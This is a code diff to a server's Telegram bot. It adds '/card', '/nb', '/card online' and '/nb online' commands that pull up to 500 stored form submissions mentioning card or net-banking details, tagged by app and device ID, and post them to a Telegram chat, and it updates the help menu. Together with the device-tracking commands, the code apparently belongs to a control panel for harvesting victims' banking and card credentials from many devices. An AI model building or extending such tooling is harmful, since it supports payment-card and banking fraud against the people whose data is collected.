@@ -1663,40 +1663,73 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       return c.json({ ok: true });
     }
 
-    // /form [filter] — form data with filter
-    if (txt === '/form' || txt.startsWith('/form ')) {
-      const arg = txt.slice(5).trim().toLowerCase();
-      let whereClause = '';
-      let filterLabel = 'All';
-      if (arg === 'card') {
-        whereClause = `AND LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`;
-        filterLabel = 'Card';
-      } else if (arg === 'net banking' || arg === 'netbanking' || arg === 'nb') {
-        whereClause = `AND LOWER(data::text) LIKE '%net banking%'`;
-        filterLabel = 'Net Banking';
-      } else if (arg === 'card online' || arg === 'card with online') {
-        whereClause = `AND LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`;
-        filterLabel = 'Card + Online';
-      } else if (arg === 'net banking online' || arg === 'nb online' || arg === 'netbanking online') {
-        whereClause = `AND LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`;
-        filterLabel = 'Net Banking + Online';
-      } else if (arg === 'all online' || arg === 'online') {
-        whereClause = `AND LOWER(data::text) LIKE '%online%'`;
-        filterLabel = 'All + Online';
-      }
-      const [formRows, countRows] = await Promise.all([
-        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE 1=1 ${whereClause} ORDER BY submitted_at DESC LIMIT 40`),
-        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE 1=1 ${whereClause}`),
+    // /card — all card form data from DB
+    if (txt === '/card' || txt.startsWith('/card ')) {
+      const [cardRows, countRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`),
       ]);
-      const totalCount = (countRows[0] as {c:string}).c;
-      let out = `<b>Form Data — ${filterLabel}</b>\n`;
-      out += `Total: <b>${totalCount}</b>  |  Showing: latest ${(formRows as unknown[]).length}\n`;
-      out += `Filters: card | net banking | all | card online | nb online | all online\n\n`;
-      if ((formRows as unknown[]).length === 0) { out += 'No form data found for this filter.'; }
-      (formRows as Array<Record<string,unknown>>).forEach((f, i) => {
-        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}: ${v}`).join(' | ');
-        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : '—';
-        out += `${i+1}. [${f.app_id}] [${f.device_id}]\n   ${fields.substring(0, 150)}\n   ${t}\n`;
+      const total = (countRow[0] as {c:string}).c;
+      let out = `<b>Card Form Data</b>  Total: <b>${total}</b>  Showing: ${(cardRows as unknown[]).length}\n\n`;
+      if ((cardRows as unknown[]).length === 0) { out += 'No card form data found.'; }
+      (cardRows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
+        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /nb — all net banking form data from DB
+    if (txt === '/nb' || txt === '/netbanking' || txt.startsWith('/nb ')) {
+      const [nbRows, countRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%'`),
+      ]);
+      const total = (countRow[0] as {c:string}).c;
+      let out = `<b>Net Banking Form Data</b>  Total: <b>${total}</b>  Showing: ${(nbRows as unknown[]).length}\n\n`;
+      if ((nbRows as unknown[]).length === 0) { out += 'No net banking form data found.'; }
+      (nbRows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
+        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /card online — card form data with online filter
+    if (txt === '/card online' || txt === '/cardonline') {
+      const [rows, countRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
+      ]);
+      const total = (countRow[0] as {c:string}).c;
+      let out = `<b>Card + Online Form Data</b>  Total: <b>${total}</b>  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No card+online form data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
+        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /nb online — net banking form data with online filter
+    if (txt === '/nb online' || txt === '/nbonline') {
+      const [rows, countRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
+      ]);
+      const total = (countRow[0] as {c:string}).c;
+      let out = `<b>Net Banking + Online Form Data</b>  Total: <b>${total}</b>  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No net banking+online form data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) : '';
+        out += `${i+1}. [${f.app_id}][${f.device_id}] ${t}\n   ${fields.substring(0, 160)}\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
@@ -1807,25 +1840,26 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         `3.  /7d              Last 7 days data\n\n` +
         `<b>[MESSAGES & FORMS]</b>\n` +
         `4.  /last [n]        Last N messages (default 10)\n` +
-        `5.  /form [filter]   Form data by filter\n` +
-        `    card | net banking | all\n` +
-        `    card online | nb online | all online\n` +
-        `6.  /search &lt;text&gt;   Search last 200 records\n\n` +
+        `5.  /card            All card form data (from DB)\n` +
+        `6.  /nb              All net banking form data (from DB)\n` +
+        `7.  /card online     Card + online form data\n` +
+        `8.  /nb online       Net banking + online form data\n` +
+        `9.  /search &lt;text&gt;   Search last 200 records\n\n` +
         `<b>[DEVICES]</b>\n` +
-        `7.  /online          Active in last 15 min\n` +
-        `8.  /offline         Offline devices\n` +
-        `9.  /dev &lt;id&gt;        Device quick lookup\n\n` +
+        `8.  /online          Active in last 15 min\n` +
+        `9.  /offline         Offline devices\n` +
+        `10. /dev &lt;id&gt;        Device quick lookup\n\n` +
         `<b>[APPS]</b>\n` +
-        `10. /apps            All App IDs\n` +
-        `11. /app &lt;appId&gt;     App devices\n` +
-        `12. /app &lt;appId&gt; &lt;devId&gt;        Device data\n` +
-        `13. /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt;  Search device\n\n` +
+        `11. /apps            All App IDs\n` +
+        `12. /app &lt;appId&gt;     App devices\n` +
+        `13. /app &lt;appId&gt; &lt;devId&gt;        Device data\n` +
+        `14. /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt;  Search device\n\n` +
         `<b>[STATS]</b>\n` +
-        `14. /total           Total counts (all apps)\n` +
-        `15. /stats           Per-app breakdown\n\n` +
+        `15. /total           Total counts (all apps)\n` +
+        `16. /stats           Per-app breakdown\n\n` +
         `<b>[CONTROL]</b>\n` +
-        `16. /stop            Resume notifications\n` +
-        `17. /start           Show this menu`;
+        `17. /stop            Resume notifications\n` +
+        `18. /start           Show this menu`;
       await tgReply(token, chatId, help);
       return c.json({ ok: true });
     }
